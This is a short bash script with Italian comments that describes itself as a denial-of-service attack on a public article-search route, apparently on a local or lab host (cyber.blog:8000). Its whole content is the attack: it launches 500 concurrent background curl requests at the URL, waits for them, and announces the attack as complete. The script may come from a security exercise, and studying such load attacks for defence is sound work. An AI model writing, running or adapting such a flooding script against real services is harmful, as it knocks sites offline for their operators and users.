#!/bin/bash
 
# Script di attacco DoS sulla rotta pubblica di ricerca articoli
# Obiettivo: mandare TANTISSIME richieste insieme, senza aspettare la risposta una per una
 
URL="http://cyber.blog:8000/articles/?query=test"
REQUESTS=500
 
echo "Lancio $REQUESTS richieste a $URL"
echo "Inizio: $(date)"
 
for i in $(seq 1 $REQUESTS)
do
  curl -s -o /dev/null "$URL" &
done
 
wait
 
echo "Fine: $(date)"
echo "Attacco completato"
 
